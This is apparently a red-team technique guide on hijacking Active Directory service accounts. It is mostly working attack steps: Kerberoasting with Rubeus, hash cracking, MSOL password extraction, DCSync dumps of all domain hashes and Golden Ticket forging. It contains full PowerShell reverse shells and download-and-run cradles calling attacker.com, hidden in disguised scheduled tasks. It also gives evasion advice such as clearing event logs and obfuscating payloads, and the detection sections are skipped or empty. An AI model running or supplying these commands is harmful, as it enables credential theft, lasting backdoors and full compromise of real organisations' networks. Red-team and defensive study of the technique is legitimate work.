# [PERSIST-VALID-001]: Service Account Hijacking

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-VALID-001 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Server 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (Design issue, not a CVE) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Service Account Hijacking is a persistence technique where an attacker gains control of a privileged service account—typically with high-level permissions like SeImpersonatePrivilege, replication rights, or domain-level delegation—and uses it to maintain long-term unauthorized access to critical infrastructure. Unlike regular user accounts, service accounts often have non-expiring passwords, execute with elevated privileges, and are less frequently monitored for anomalous activity. Once compromised, they become a virtually undetectable persistence mechanism because their activity appears legitimate within normal operational context.

**Attack Surface:** Service accounts running Windows services (MSSQL, IIS, Exchange, SCCM), database applications, scheduled tasks, and application pools. Particularly valuable targets include the MSOL account used by Azure AD Connect, scheduled task accounts with high privileges, and accounts with Kerberos delegation enabled.

**Business Impact:** **Complete domain compromise or critical infrastructure takeover.** Once an attacker controls a service account with replication rights (like MSOL), they can extract all AD user password hashes via DCSync. If the service account has SeImpersonatePrivilege, attackers can escalate to SYSTEM. For accounts running critical services (Exchange, SCCM), attackers can pivot laterally, modify configurations, install backdoors, or exfiltrate sensitive data.

**Technical Context:** A typical service account compromise to persistence takes **5-30 minutes** to establish depending on the account's permissions. Detection likelihood is **LOW** if the attacker only uses the account for passive monitoring or legitimate-looking actions (such as scheduled sync operations). The persistence is **indefinite**—service accounts often never require password changes, and remediation is complex because services break if credentials are rotated without proper testing.

### Operational Risk

- **Execution Risk:** **Medium** – Requires initial access to the service account credentials (via Kerberoasting, credential dumping, or misconfigurations). However, once obtained, the hijacking itself is trivial: just use the account to authenticate.
- **Stealth:** **Low** – Modern SOCs can detect unusual logon locations, times, or lateral movement from service accounts. However, if the attacker only monitors traffic or performs actions that align with the service's normal behavior, detection becomes very difficult.
- **Reversibility:** **No** – Service account hijacking is essentially permanent until credentials are rotated. Even then, if the attacker has DCSync permissions, they can extract the new password from AD.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3 | Ensure that user accounts are not members of multiple administrative groups |
| **CIS Benchmark** | 5.2.4 | Ensure that service accounts are configured to use a long, complex password |
| **DISA STIG** | GEN000800 | System accounts must use strong authentication mechanisms |
| **NIST 800-53** | AC-2(1) | User Registration and De-registration |
| **NIST 800-53** | IA-2(3) | User Identification and Authentication with MFA |
| **NIST 800-53** | AC-6 | Least Privilege |
| **GDPR** | Art. 32 | Security of Processing (Encryption, Access Control) |
| **NIS2** | Art. 21(3) | Vulnerability and Patch Management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Compromise of Domain Service Accounts |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- For exploitation: Valid credentials of the target service account (obtained via OS Credential Dumping, Kerberoasting, password spray, or misconfigurations)
- For persistence: The service account must already be running and authenticated on the target system

**Required Access:** 
- Network access to systems where the service account authenticates
- Ability to submit authentication requests as the service account (direct logon or via application/service)

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **PowerShell:** Version 5.0+ for enumeration and verification
- **Active Directory:** Any version supporting domain accounts

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (C# Kerberos abuse toolkit, Version 1.6.4+)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Windows credential dumping tool, Version 2.2.0+)
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Multi-tool for network protocol exploitation, Version 0.10.0+)
- [ADCSPwn](https://github.com/shelliv/ADCSPwn) (ADCS privilege escalation toolkit)
- PowerShell remoting (built-in, requires WinRM enabled)
- Windows Task Scheduler (built-in)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

Enumerate service accounts and their privileges:

```powershell
# Find all service accounts in Active Directory
Get-ADUser -Filter {Enabled -eq $true} -Properties ServicePrincipalName, PasswordNeverExpires, PasswordLastSet | `
  Where-Object {$_.ServicePrincipalName -ne $null -or $_.PasswordNeverExpires -eq $true} | `
  Select-Object SamAccountName, Name, ServicePrincipalName, PasswordNeverExpires, PasswordLastSet

# Check which accounts have SeImpersonatePrivilege (requires local admin access on target system)
whoami /priv | findstr /I "impersonate"

# Enumerate accounts with high privileges (Domain Admin, Enterprise Admin)
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Get-ADUser -Properties PasswordNeverExpires

# Find service accounts that never expire passwords (high-risk for persistence)
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties Description, ServicePrincipalName | `
  Where-Object {$_.ServicePrincipalName -ne $null}
```

**What to Look For:**
- **MSOL_* accounts** (created by Azure AD Connect) – These have replication rights and can perform DCSync
- **Service accounts with PasswordNeverExpires = $true** – Never require rotation, perfect for persistence
- **Accounts in "Domain Admins" group** – Highest privilege targets
- **Accounts with ServicePrincipalName (SPN) set** – Can be Kerberoasted
- **SQL Server accounts, IIS app pool identities, Exchange service accounts** – Often have SeImpersonatePrivilege
- **Accounts with unusual last logon times or gaps** – Indicates possible compromise

**Version Note:** PowerShell commands are consistent across Server 2016 through 2025.

### Windows Event Log Reconnaissance

Check recent logon events for service accounts:

```powershell
# Find recent successful logons by service accounts
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]] and *[EventData[Data[@Name='TargetUserName'] = 'ServiceAccountName']]" -MaxEvents 100 | `
  Select-Object TimeCreated, @{N="LogonType";E={$_.Properties[8].Value}}, @{N="SourceIP";E={$_.Properties[18].Value}}

# Check for accounts with no logon activity (might indicate compromise if they suddenly start logging on)
Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | `
  Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select-Object SamAccountName, LastLogonDate
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Via Kerberoasting Service Account Credentials

**Supported Versions:** Server 2016-2025

This method assumes the attacker has already obtained the service account credentials through Kerberoasting (ticket cracking), credential dumping, or other means. The goal is to use these credentials to authenticate as the service account and establish persistence.

#### Step 1: Obtain Service Account Credentials via Kerberoasting

**Objective:** Extract TGS tickets for service accounts with weak passwords and crack them offline.

**Command (Any Domain-Joined Machine):**
```powershell
# Method 1: Using Rubeus (fastest, OPSEC-safe with /nowrap flag)
.\Rubeus.exe kerberoast /nowrap | Tee-Object -FilePath ".\kerberoast_hashes.txt"

# Method 2: Using Rubeus with specific target filtering
.\Rubeus.exe kerberoast /ldapfilter:"(servicePrincipalName=*)" /nowrap

# Method 3: Request tickets for a specific user
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

**Expected Output:**
```
[*] Action: Kerberoasting

[*] Searching the current domain for SPNs matching '*'
[*] Found 5 SPNs

[*] Kerberoasting against '1 total principals'

[*] Kerberoasting 'DOMAIN\svc_sql'
  Hash written to console.
  $krb5tgs$23$*DOMAIN\svc_sql$krbtgt/DOMAIN.COM$1e4a6c00ba8176c25f2bb3ac94d3cc49$f8a...

[+] Kerberoasted users written to : kerberoast_hashes.txt
```

**What This Means:**
- The hash is encrypted with the **service account's password**
- This ticket can be cracked offline using **Hashcat** (`hashcat -m 13100 <hash.txt> <wordlist>`) or **John the Ripper**
- Each SPN enumerated is a potential target for password cracking

**OpSec & Evasion:**
- Kerberoasting generates **Event ID 4769** on domain controllers, but these events are high-volume and often overlooked
- Use `/nowrap` flag to avoid line breaks that might trigger IDS
- Avoid running on a domain controller itself
- Spread requests over time (multiple hours/days) rather than all at once
- Consider disabling RC4 in the environment to force AES-256 encryption (harder to crack)

**Troubleshooting:**
- **Error:** "Object reference not set to an instance of an object"
  - **Cause:** Rubeus cannot connect to domain controller
  - **Fix:** Ensure you're on a domain-joined machine and can reach the DC on port 389 (LDAP) and 88 (Kerberos)

- **Error:** "No SPNs found matching criteria"
  - **Cause:** No service accounts exist, or filter is too restrictive
  - **Fix:** Try `/user:*` to enumerate all users first, then filter manually

**References & Proofs:**
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Kerberoasting Guide by Harmj0y](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
- [MITRE ATT&CK - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/003/)

---

#### Step 2: Crack the Kerberos Hash Offline

**Objective:** Use GPU/CPU resources to brute-force the service account password.

**Command (On Attack Machine - Linux/Windows):**
```bash
# Using Hashcat (GPU-accelerated, fastest)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Using John the Ripper (CPU-based)
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Increase verbosity to monitor progress
hashcat -m 13100 -a 0 --status --status-timer=5 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Expected Output (Success):**
```
$krb5tgs$23$*DOMAIN\svc_sql$krbtgt/DOMAIN.COM$...:password123!

Session..........: Hashcat
Status...........: Cracked
Hash.Name.........: Kerberos 5, etype 23, TGS
Hash.Target......: $krb5tgs$23$*DOMAIN\svc_sql$krbtgt/DOMAIN.COM$...
Time.Started......: Thu Jan 09 14:30:42 2025 (2 mins, 30 secs)
Time.Estimated...: Thu Jan 09 14:33:12 2025
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Plain
Speed.#1.........: 125.6 MH/s (GPU)
Progress.........: 645280/14344391 (4.50%)
```

**What This Means:**
- The cracked password is now usable for authentication
- This password likely hasn't changed in months or years (service accounts often have static passwords)
- Once cracked, the attacker can use it indefinitely

**OpSec & Evasion:**
- Perform cracking **off-network** (never expose GPU cracking infrastructure to target network)
- Use rules-based cracking (slow but thorough) rather than dictionary alone
- Store cracked credentials securely

**References & Proofs:**
- [Hashcat Kerberos Cracking](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [John the Ripper Usage](https://www.openwall.com/john/doc/)

---

#### Step 3: Authenticate as Service Account and Persist

**Objective:** Use the cracked credentials to log in as the service account and establish persistence mechanisms.

**Command (Scenario A: Direct Service Logon via Scheduled Task):**
```powershell
# Create a scheduled task that runs a reverse shell or backdoor as the service account
$TaskName = "WindowsUpdateCheck"  # Benign-sounding name
$TaskDescription = "Automated Windows Update Verification"
$Trigger = New-ScheduledTaskTrigger -AtStartup  # Runs at every server restart
$Principal = New-ScheduledTaskPrincipal -UserId "DOMAIN\svc_sql" -LogonType Password -RunLevel Highest
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
  -Argument "-NoProfile -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')`""

Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -Principal $Principal `
  -Action $Action -Description $TaskDescription -Force

# Verify persistence
Get-ScheduledTask -TaskName $TaskName | Get-ScheduledTaskInfo
```

**Command (Scenario B: WinRM Remoting Persistence):**
```powershell
# Enable WinRM if not already enabled
Enable-PSRemoting -Force

# Create a Credential object using the compromised service account
$SecPassword = ConvertTo-SecureString "password123!" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ("DOMAIN\svc_sql", $SecPassword)

# Test authentication
$Session = New-PSSession -ComputerName "TargetServer" -Credential $Credential
Invoke-Command -Session $Session -ScriptBlock {whoami}

# Install backdoor via WinRM (runs with service account privileges)
Invoke-Command -Session $Session -ScriptBlock {
  $BackdoorPath = "C:\Windows\System32\config\svc_service.ps1"
  $BackdoorCode = @"
    while ($true) {
      try {
        $socket = New-Object Net.Sockets.TcpClient('attacker.com', 4444)
        $stream = $socket.GetStream()
        [byte[]]$buffer = 0..255 | ForEach-Object {0}
        while (($i = $stream.Read($buffer, 0, 256)) -ne 0) {
          $command = ([text.encoding]::UTF8).GetString($buffer, 0, $i)
          $result = Invoke-Expression $command 2>&1
          $bytes = [text.encoding]::UTF8.GetBytes($result)
          $stream.Write($bytes, 0, $bytes.Length)
        }
      } catch { Start-Sleep -Seconds 5 }
    }
"@
  Set-Content -Path $BackdoorPath -Value $BackdoorCode -Force
}
```

**Command (Scenario C: SeImpersonatePrivilege Escalation to SYSTEM):**

*(If the service account has SeImpersonatePrivilege)*

```powershell
# First, verify SeImpersonatePrivilege is present
whoami /priv | findstr /I "impersonate"

# Download and execute PrintSpoofer (escalates to SYSTEM)
# Assuming attacker has RCE as the service account
.\PrintSpoofer.exe -i -c "cmd /c powershell.exe -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")'"
```

**Expected Output:**
```powershell
PS C:\> Get-ScheduledTask -TaskName "WindowsUpdateCheck"

TaskPath                                       TaskName                    State
--------                                       --------                    -----
\Microsoft\Windows\Update\                     WindowsUpdateCheck          Ready

PS C:\> Invoke-Command -Session $Session -ScriptBlock {whoami}
DOMAIN\svc_sql
```

**What This Means:**
- The scheduled task now runs **every time the server starts**, executing code with service account privileges
- If the service account has **SeImpersonatePrivilege** or **Domain Admin rights**, the attacker can further escalate to SYSTEM or modify AD
- WinRM persistence allows **remote code execution** on any system where the service account can authenticate

**OpSec & Evasion:**
- Use **scheduled task names that blend in** with legitimate Windows tasks (e.g., "WindowsUpdateCheck", "SystemMaintenanceTask")
- Place PowerShell backdoors in **hidden System32 directories** (e.g., `C:\Windows\System32\drivers\etc\config\`)
- Disable task history logging: `wevtutil cl Microsoft-Windows-TaskScheduler/Operational`
- Use **obfuscated PowerShell** to avoid signature-based detection
- Avoid **Event Viewer** manual inspection by cleaning logs immediately after execution

**Detection Likelihood:** **Medium** – SOCs monitoring Event ID 4698 (Scheduled Task Created) and suspicious task execution will catch this within days to weeks if they have proper alerting.

**Troubleshooting:**
- **Error:** "Access Denied" when creating scheduled task
  - **Cause:** Insufficient privileges; service account is not in local Administrators group
  - **Fix:** Use a different persistence method, or escalate privileges first (see Scenario C)

- **Error:** "The system cannot find the path specified" (PrintSpoofer)
  - **Cause:** Print Spooler service not running or path is incorrect
  - **Fix:** Start the Print Spooler: `Start-Service -Name Spooler` (if you have admin access)

**References & Proofs:**
- [PrintSpoofer - PrintNightmare Exploitation](https://github.com/itm4n/PrintSpoofer)
- [Scheduled Task Persistence - MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/005/)
- [WinRM Code Execution - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/winrm)

---

### METHOD 2: Via Azure AD Connect (MSOL Account) for Hybrid AD Persistence

**Supported Versions:** Server 2016-2025 (Azure AD Connect 1.4.0+)

This method exploits the MSOL (Microsoft Online Services) service account used by Azure AD Connect. The MSOL account has **Replicating Directory Changes** rights, enabling DCSync attacks. Compromising it allows extraction of all AD password hashes and creation of Golden Tickets.

#### Step 1: Identify Azure AD Connect Server and Extract MSOL Credentials

**Objective:** Locate the Azure AD Connect server and extract the encrypted MSOL account password.

**Command (On Domain-Joined Machine):**
```powershell
# Find Azure AD Connect server (look for ADSync service)
Get-ADComputer -Filter {ServicePrincipalName -like "*ADSync*"} | Select-Object Name, DistinguishedName

# Alternatively, search for computer with Azure AD Connect installed
Get-ADComputer -Filter * -Properties Description | Where-Object {$_.Description -like "*Azure*"} | Select-Object Name, Description
```

**Command (On Azure AD Connect Server - Requires Local Admin):**
```powershell
# Download the MSOL credential extraction script (xpn's azuread_decrypt_msol_v2.ps1)
# Reference: https://github.com/xpn/Blog/blob/main/scripts/azuread_decrypt_msol.ps1

# Run the script to extract the MSOL account password
.\azuread_decrypt_msol_v2.ps1

# Expected output:
# MSOL_aadds123456 : "P@ssw0rd!Complex123!"
```

**What This Means:**
- The **MSOL account password is now decrypted** from the Azure AD Connect configuration database
- This account has **Replicating Directory Changes (DCSync)** rights on the entire domain
- With this password, the attacker can extract **all user password hashes** from AD

**OpSec & Evasion:**
- The script read **encrypted credential storage** (mirrored_encrypted_pub_key in the config database)
- No network traffic is generated; the extraction is entirely local
- Defender/EDR might flag PowerShell script execution; use **encoded/obfuscated variants** or execute from Cmd.exe

**Troubleshooting:**
- **Error:** "Access Denied" accessing the ADSync database
  - **Cause:** Not running as Local Administrator
  - **Fix:** `Run as administrator` or escalate privileges first

- **Error:** "Could not find Azure AD Connect installation"
  - **Cause:** Azure AD Connect is not installed on this machine
  - **Fix:** Identify the correct AAD Connect server and run the script there

**References & Proofs:**
- [xpn's Azure AD Connect Credential Extraction](https://blog.xpn.uk/2020/04/10/unmasking-azure-ad-connect-azure-ad-domain-controller-synchronisation/)
- [Sygnia's Azure AD Connect Attack Vectors](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/)

---

#### Step 2: Perform DCSync Attack Using MSOL Credentials

**Objective:** Extract all domain user password hashes using the compromised MSOL account.

**Command (Linux via Impacket):**
```bash
# Perform DCSync using the MSOL account credentials
impacket-secretsdump -just-dc-user krbtgt \
  -username "DOMAIN\\MSOL_aadds123456" \
  -password "P@ssw0rd!Complex123!" \
  "DOMAIN.COM/DC01.DOMAIN.COM"

# Extract all hashes (full database dump)
impacket-secretsdump -just-dc \
  -username "DOMAIN\\MSOL_aadds123456" \
  -password "P@ssw0rd!Complex123!" \
  "DOMAIN.COM/DC01.DOMAIN.COM" \
  > ad_hashes.txt
```

**Command (Windows via Mimikatz):**
```powershell
# Authenticate as MSOL account and perform DCSync
sekurlsa::logonpasswords  # Shows current credentials
lsadump::dcsync /domain:DOMAIN.COM /user:DOMAIN\Administrator  # Extract Administrator hash
lsadump::dcsync /domain:DOMAIN.COM /all /csv  # Extract all hashes to CSV
```

**Expected Output:**
```
[-] Kerberos Library loaded
[*] Using the DC 'DC01.DOMAIN.COM' : '10.0.0.10'
[*] Getting KRBTGT Account Credentials
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for PrimaryGroupID = 513 ( Domain Users )
DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
DOMAIN\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DOMAIN\svc_sql:1104:aad3b435b51404eeaad3b435b51404ee:7c6092013f8454ca6422f46fdbf6e5f3:::
```

**What This Means:**
- The **NTLM hashes of all domain users are now extracted** and stored locally
- These hashes can be **passed directly** (Pass-the-Hash attack) to authenticate as any user
- Alternatively, they can be **cracked offline** to obtain plaintext passwords
- The attacker now has **complete domain access** and can create Golden Tickets for persistence

**OpSec & Evasion:**
- DCSync generates **Event ID 4662** on the DC (Directory Services Access)
- However, these events are high-volume and often ignored
- Spread DCSync calls over time; don't dump entire domain at once
- Use dedicated extraction tools that minimize logging (Impacket over MimiKatz if possible)

**Detection Likelihood:** **Medium** – SOCs with proper monitoring will detect DCSync within hours of execution

**Troubleshooting:**
- **Error:** "Couldn't authenticate to ... | Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY"
  - **Cause:** Password is incorrect or account is locked
  - **Fix:** Verify MSOL credentials; reset MSOL password if needed

- **Error:** "[-] error in lsadump::dcsync"
  - **Cause:** User does not have DCSync rights
  - **Fix:** Verify MSOL account has "Replicating Directory Changes" and "Replicating Directory Changes All" rights

**References & Proofs:**
- [Impacket Secretsdump Usage](https://github.com/SecureAuthCorp/impacket/wiki/Examples#secretsdump)
- [Mimikatz DCSync Guide](https://posts.specterops.io/how-to-detect-pass-the-hash-attacks-a6e36294e64)

---

#### Step 3: Create Golden Ticket Using Extracted krbtgt Hash

**Objective:** Create a forged Kerberos TGT that grants **indefinite domain access** and persists across password resets.

**Command (Mimikatz):**
```powershell
# Create Golden Ticket using extracted krbtgt hash
# Format: kerberos::golden /domain:DOMAIN.COM /sid:S-1-5-21-XXXX... /krbtgt:HASH /user:Administrator

kerberos::golden /domain:DOMAIN.COM /sid:S-1-5-21-3623811015-3361044348-30300510 `
  /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 `
  /user:Administrator `
  /ticket:golden.kirbi

# Inject the ticket into memory
kerberos::ptt golden.kirbi

# Verify ticket is injected
klist  # List Kerberos tickets
```

**Command (Alternative: Rubeus):**
```powershell
# Create and inject Golden Ticket in one command
.\Rubeus.exe golden /domain:DOMAIN.COM /sid:S-1-5-21-3623811015-3361044348-30300510 `
  /krbtgt:5f4dcc3b5aa765d61d8327deb882cf99 `
  /user:Administrator `
  /nowrap

# The ticket is automatically injected; verify with:
.\Rubeus.exe klist
```

**Expected Output:**
```
 Client: Administrator @ DOMAIN.COM
 Server: krbtgt/DOMAIN.COM @ DOMAIN.COM
 KerbTicket Encryption Type: RC4-HMAC (3)
 Ticket Flags 0x40a00000 ( forwardable renewable pre_authenticated )
 Start Time: 1/9/2025 14:30:42 (local)
 End Time:   1/9/2030 14:30:42 (local)
 Renew Time: 1/16/2025 14:30:42 (local)
```

**What This Means:**
- The **Golden Ticket is valid for 10 years** (by default) and grants full domain admin access
- It authenticates as **Administrator** and grants the **TGT (Ticket-Granting Ticket)** for the entire domain
- The attacker can now **access any resource** without knowing any passwords
- Even if all AD passwords are reset, the Golden Ticket remains valid

**OpSec & Evasion:**
- Golden Tickets use the **krbtgt password hash**, not current passwords
- Once created, they **survive password rotations** because they're pre-signed with the old krbtgt hash
- Detection requires **monitoring for unusual Kerberos activity** (e.g., tickets with 10-year validity)
- Use realistic ticket lifetimes (default is 10 hours for TGT) to avoid suspicion

**Detection Likelihood:** **Low-Medium** – Only detected if SOC monitors Kerberos ticket validity periods and service account DCSync access

**Troubleshooting:**
- **Error:** "The system cannot find the file specified" (Mimikatz)
  - **Cause:** Mimikatz not found in PATH
  - **Fix:** Run from the directory containing `mimikatz.exe` or add to PATH

- **Error:** "Invalid data" when injecting ticket
  - **Cause:** krbtgt hash is incorrect
  - **Fix:** Re-extract krbtgt hash from DCSync output

**References & Proofs:**
- [Mimikatz Golden Ticket Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)
- [Harmj0y's Golden Ticket Guide](https://blog.harmj0y.net/redteam/mimikatz-and-dcsync-and-extrasids-oh-my/)
- [MITRE ATT&CK - Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/001/)

---

### METHOD 3: Via Scheduled Task Password Storage in Windows Credential Manager

**Supported Versions:** Server 2016-2025

Service accounts often have their passwords stored in Windows Credential Manager when tasks are scheduled via Task Scheduler. An attacker with local admin access can extract these credentials.

#### Step 1: Enumerate Scheduled Tasks with Stored Credentials

**Objective:** Identify scheduled tasks running under service account context.

**Command:**
```powershell
# List all scheduled tasks with associated user accounts
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*svc*" -or $_.Principal.UserId -like "*service*"} | `
  Select-Object TaskName, @{N="User";E={$_.Principal.UserId}}, State

# Alternative: Export all scheduled tasks to XML for analysis
Get-ScheduledTask | ForEach-Object {Export-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath} | Out-File -FilePath "scheduled_tasks_export.xml"
```

**Expected Output:**
```
TaskName                             User                          State
--------                             ----                          -----
ADUserSyncTask                       DOMAIN\svc_ad_sync            Ready
DatabaseMaintenanceJob               DOMAIN\svc_sql                Ready
ExchangeMailboxMigration             DOMAIN\svc_exchange           Ready
```

---

#### Step 2: Extract Credential from Windows Credential Manager

**Objective:** Decrypt the stored credential for the service account.

**Command (PowerShell):**
```powershell
# List all stored credentials
cmdkey /list

# Extract credential for specific service account
$creds = Get-Credential -UserName "DOMAIN\svc_sql" -Message "Re-enter credentials"

# Dump credentials from Credential Manager (requires Mimikatz or similar)
# Using Mimikatz:
dpapi::cred /in:C:\Users\Admin\AppData\Roaming\Microsoft\Credentials\XXXX
```

**Command (Using Mimikatz):**
```powershell
# Enumerate DPAPI-encrypted credentials
sekurlsa::dpapi  # Dump all cached DPAPI secrets

# Decrypt specific credential file
dpapi::cred /in:C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\BDDA12345
```

**Expected Output:**
```
[DPAPI_CREDENTIAL]
credentialBlob : 01000000d08c9ddf0115d1118c7a00c04fc297eb010000000000
dwFlags : 00000001 (has credential)
credentialBlobSize : 0x64 (100 bytes)
credentialRaw : 0123456789...

[DECRYPTED]
credentialType : 1 (CRED_TYPE_DOMAIN_PASSWORD)
userName : DOMAIN\svc_sql
credentialBlob : "P@ssw0rd!Service123"
```

**OpSec & Evasion:**
- Windows Credential Manager stores credentials **encrypted with DPAPI**
- Decryption requires the **user's DPAPI master key**, which is stored in:
  - `C:\Users\<Username>\AppData\Roaming\Microsoft\Protect\<SID>\`
- If you have **local admin access**, you can use Mimikatz to extract the master key and decrypt credentials
- This method is **silent** – no event logs are generated for credential extraction

---

#### Step 3: Persist Using Extracted Service Account Credentials

**Objective:** Use extracted credentials to establish persistent backdoor access.

**Command:**
```powershell
# Store extracted credential in a variable
$SecPassword = ConvertTo-SecureString "P@ssw0rd!Service123" -AsPlainText -Force
$Credential = New-Object PSCredential("DOMAIN\svc_sql", $SecPassword)

# Option A: Create a permanent WinRM listener as service account
$Params = @{
    TaskName = "WindowsServiceHealthCheck"
    Description = "Automated Windows Service Status Check"
    Trigger = New-ScheduledTaskTrigger -AtStartup
    Principal = New-ScheduledTaskPrincipal -UserId "DOMAIN\svc_sql" -LogonType Password -RunLevel Highest
    Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -Command 'while (`$true) { Start-Sleep -Seconds 5 }'"
}
Register-ScheduledTask @Params -Force

# Option B: Create a reverse shell as service account
$ReverseShell = @"
\$client = New-Object System.Net.Sockets.TcpClient('attacker.com', 4444)
\$stream = \$client.GetStream()
\$buffer = New-Object System.Byte[] 1024
while ((\$read = \$stream.Read(\$buffer, 0, 1024)) -ne 0) {
  \$cmd = [System.Text.Encoding]::UTF8.GetString(\$buffer, 0, \$read)
  \$output = Invoke-Expression \$cmd 2>&1 | Out-String
  \$bytes = [System.Text.Encoding]::UTF8.GetBytes(\$output)
  \$stream.Write(\$bytes, 0, \$bytes.Length)
}
\$client.Close()
"@

$TaskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ReverseShell)))"
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "DOMAIN\svc_sql" -LogonType Password -RunLevel Highest

Register-ScheduledTask -TaskName "SystemMaintenanceTask" -Action $TaskAction -Trigger $TaskTrigger -Principal $TaskPrincipal -Force

# Option C: Direct authentication to remote systems
Invoke-Command -ComputerName "SQLServer01" -Credential $Credential -ScriptBlock {
  # Install backdoor as service account
  New-Item -Path "C:\Windows\System32\drivers\etc\config\svc_monitor.ps1" -Type File -Force
  Set-Content -Path "C:\Windows\System32\drivers\etc\config\svc_monitor.ps1" -Value $ReverseShell
}
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+ (current)  
**Minimum Version:** 1.5.0  
**Supported Platforms:** Windows (x86, x64)

**Version-Specific Notes:**
- **Version 1.5.x:** Basic Kerberoasting support
- **Version 1.6.x+:** Golden Ticket, Silver Ticket, constrained delegation abuse
- **Version 1.7.0+:** PRT (Primary Refresh Token) support for Entra ID

**Installation:**
```powershell
# Clone or download from GitHub
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus

# Compile (requires Visual Studio or dotnet CLI)
dotnet build -c Release

# The compiled binary will be at: Rubeus/bin/Release/net48/Rubeus.exe

# Or download pre-compiled binary from releases
wget https://github.com/GhostPack/Rubeus/releases/download/v1.6.4/Rubeus.exe
```

**Usage:**
```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /nowrap

# Golden Ticket
.\Rubeus.exe golden /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator

# Check tickets
.\Rubeus.exe klist
```

---

### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+ (current)  
**Minimum Version:** 2.0.0  
**Supported Platforms:** Windows (x86, x64, ARM64)

**Installation:**
```powershell
# Download from releases
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210529/mimikatz_trunk.zip
Expand-Archive -Path mimikatz_trunk.zip -DestinationPath C:\Tools\mimikatz\

# Run (requires admin)
C:\Tools\mimikatz\x64\mimikatz.exe
```

**Usage:**
```powershell
lsadump::dcsync /domain:DOMAIN.COM /user:Administrator
kerberos::golden /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:HASH /user:Administrator
sekurlsa::logonpasswords
```

---

### [Impacket](https://github.com/SecureAuthCorp/impacket)

**Version:** 0.10.0+ (current)  
**Minimum Version:** 0.9.20  
**Supported Platforms:** Linux, macOS, Windows (via WSL or Python)

**Installation:**
```bash
# Install via pip
pip3 install impacket

# Or clone and install from source
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

**Usage:**
```bash
impacket-secretsdump -just-dc-user krbtgt -username "DOMAIN\\MSOL_svc" -password "PASSWORD" "DOMAIN/DC01"
impacket-psexec -k -no-pass Administrator@domain.com  # Pass-the-hash via Kerberos
```

---

## 7. SPLUNK DETECTION RULES

*(Section skipped: Splunk rules are less relevant for scheduled task persistence because logs are generated locally. See Windows Event Log Monitoring for primary detection rules.)*

---

## 8. MICROSOFT SENTINEL DETECTION

